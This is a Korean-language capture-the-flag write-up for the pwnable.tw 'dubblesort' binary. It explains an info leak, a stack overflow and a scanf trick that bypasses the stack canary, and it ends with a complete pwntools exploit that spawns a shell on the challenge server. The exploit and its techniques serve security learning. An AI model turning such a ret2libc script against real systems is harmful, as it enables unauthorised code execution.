# [summary]
- vulnerability index
- scanf("%u",,) error

# analysis
```console
m444ndu@ubuntu:~/pwntw/doubblesort$ checksec dubblesort 
[*] '/home/m444ndu/pwntw/doubblesort/dubblesort'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```
다 걸려있습니당 ㅎㄷㄷ;;

매우 간단쓰한 구조를 취하고 있는 문제입니당. `main` 문에서 숫자 배열을 입력받고, `sorting` 함수에서 크기 순으로 정렬해주는 구조를 가지고 잇습니다.

## main()
```c
__printf_chk(1, "What your name :");
  read(0, &buf, 0x40u);
  __printf_chk(1, "Hello %s,How many numbers do you what to sort :");
  __isoc99_scanf("%u", &sort_num);
  sort_num1 = sort_num;
  if ( sort_num )
  {
    number = num;
    i = 0;
    do
    {
      __printf_chk(1, "Enter the %d number : ");
      fflush(stdout);
      __isoc99_scanf("%u", number);
      ++i;
      sort_num1 = sort_num;
      ++number;
    }
    while ( sort_num > i );
  }
  processing((unsigned int *)num, sort_num1);
  puts("Result :");
```
본 문제의 취약점은 위에서 발생합니다. 먼저, `__printf_chk()` 함수를 통해 스택 공간에 존재하는 값을 **leak** 할 수 있고, 사용자가 입력한 크기만큼 `int 배열`에 계속 입력을 받기때문에 **bof**를 통한 `eip` **컨트롤**이 가능합니다.

`__printf_chk()`를 자세히 살펴보면
```c
.text:000009F1                 mov     [esp+4], eax
.text:000009F5                 mov     dword ptr [esp], 1
.text:000009FC                 call    ___printf_chk
.text:00000A01                 mov     dword ptr [esp+8], 40h ; '@' ; nbytes
.text:00000A09                 lea     esi, [esp+8Ch+buf]
.text:00000A0D                 mov     [esp+4], esi    ; buf
.text:00000A11                 mov     dword ptr [esp], 0 ; fd
.text:00000A18                 call    _read
.text:00000A1D                 mov     [esp+8], esi
.text:00000A21                 lea     eax, (aHelloSHowManyN - 1FA0h)[ebx] ; "Hello %s,How many numbers do you what t"...
.text:00000A27                 mov     [esp+4], eax
.text:00000A2B                 mov     dword ptr [esp], 1
.text:00000A32                 call    ___printf_chk
.text:00000A37                 lea     eax, [esp+18h]
.text:00000A3B                 mov     [esp+4], eax
```
`esi`에는 `buf`의 주소가 들어가 있기 때문에 `[esp+8]` 역시 `buf`의 주소가 들어가 있으며, 따라서 `__printf_chk()`의 두 번째 인자로 `buf`가 `%s`를 통해서 출력된다고 할 수 있습니다. 대충 24바이트를 주면 끝 세자리가 000인 `libc 주소`를 **leak** 할 수 있습니다.


## sorting()
```c
  v9 = __readgsdword(0x14u);
  puts("Processing......");
  sleep(1u);
  if ( sort_num1 != 1 )
  {
    v2 = sort_num1 - 2;
    for ( i = &num[sort_num1 - 1]; ; --i )      // 뒤에서부터
    {
      if ( v2 != -1 )                           // 처음으로 다 갔을 경우
      {
        ptrnum = num;                           // 초기화
        do
        {
          first = *ptrnum;
          second = ptrnum[1];
          if ( *ptrnum > second )
          {
            *ptrnum = second;
            ptrnum[1] = first;
          }
          ++ptrnum;
        }
        while ( i != ptrnum );
        if ( !v2 )
          break;
      }
```
`sorting` 함수에서는 위에서 만든 `int 배열`들을 **오름차순으로 정렬**해줍니다.

대충 오름차순으로 배열을 알맞게 정렬해서 `ret`에 `system("/bin/sh")`를 실행시킬 수 있도록 `chain`을 구성해주면 되는데, 여기서 한가지 난관이 존재합니다.

`canary`의 경우 **leak** 할 수도 없고, 값을 덮어써서도 안됩니다. 해당 값을 그대로 사용하여야 하는데, 여기서 `scanf("%u", buf)`와 관련된 버그를 사용할 수 있습니다. `scanf()`의 경우 지정된 형식문자가 아닌 데이터가 올 경우 입력을 종료해버리는데, 이를 이용하여 `canary`를 건들지 않고 그 값 그대로 사용할 수 있습니다.

`canary`가 어떤 값을 갖느냐에 따라 좀 달라지기는 하지만, 많이 시도해보면 정확한 위치에 `canary`를 위치시킬 수 있습니다..

(before sorting..)
```c
Breakpoint * 0x565a8000+0xab3
pwndbg> x/40wx $ebp-0x80
0xff964918:	0x0000002b	0x00000001	0x00000001	0x00000001
0xff964928:	0x00000001	0x00000001	0x00000001	0x00000001
0xff964938:	0x00000001	0x00000001	0x00000001	0x00000001
0xff964948:	0x00000001	0x00000001	0x00000001	0x00000001
0xff964958:	0x00000001	0xf7e22940	0xf7e22940	0xf7e22940
0xff964968:	0xf7e22940	0xf7e22940	0xf7e22940	0xf7e22940
0xff964978:	0xf7f40e8b	0x30a6cb00	0xf7f983dc	0xff964b0b
0xff964988:	0x565a8b2b	0x00000000	0xf7f98000	0xf7f98000
0xff964998:	0x00000000	0xf7e00637	0x00000001	0xff964a34
0xff9649a8:	0xff964a3c	0x00000000	0x00000000	0x00000000
```

(after sorting..)
```c
Breakpoint * 0x565a8000+0xaf9
pwndbg> x/40wx $ebp-0x80
0xff964918:	0x0000002b	0x00000000	0x00000000	0x00000000
0xff964928:	0x00000000	0x00000000	0x00000000	0x00000001
0xff964938:	0x00000001	0x00000001	0x00000001	0x00000001
0xff964948:	0x00000001	0x00000001	0x00000001	0x00000001
0xff964958:	0x00000001	0x00000001	0x00000001	0x00000001
0xff964968:	0x00000001	0x00000001	0x00000001	0x00000001
0xff964978:	0x00000001	0x30a6cb00	0x565a8b2b	0xf7e00637
0xff964988:	0xf7e22940	0xf7e22940	0xf7e22940	0xf7e22940
0xff964998:	0xf7e22940	0xf7e22940	0xf7e22940	0xf7f40e8b
0xff9649a8:	0xf7f98000	0xf7f98000	0xf7f98000	0xf7f983dc
```


# exploit
```python
#! /usr/bin/python
from pwn import *

r = process('./dubblesort',env={'LD_PRELOAD':'./libc_32.so.6'})
r = remote('chall.pwnable.tw', 10101)
#context.log_level = 'debug'
#gdb.attach(r) # 0xab3 0xaf9

r.sendlineafter('What your name :','A'*24)
r.recvuntil('A'*24)
leak = u32(r.recv(4))
libc_base = leak - 0x0a - 1769472
success('libc_base = '+hex(libc_base))

system_addr = libc_base + 239936
binsh_addr = libc_base + 1412747

log.info('system_addr = '+hex(system_addr))
log.info('binsh_addr = '+hex(binsh_addr))

r.sendlineafter('do you what to sort :','43')

for i in range(16):
    r.sendlineafter('number : ','1')

for i in range(7):
    r.sendlineafter('number : ',str(system_addr))    
r.sendlineafter('number : ',str(binsh_addr))    

r.sendlineafter('number : ','h')    

r.interactive()
```
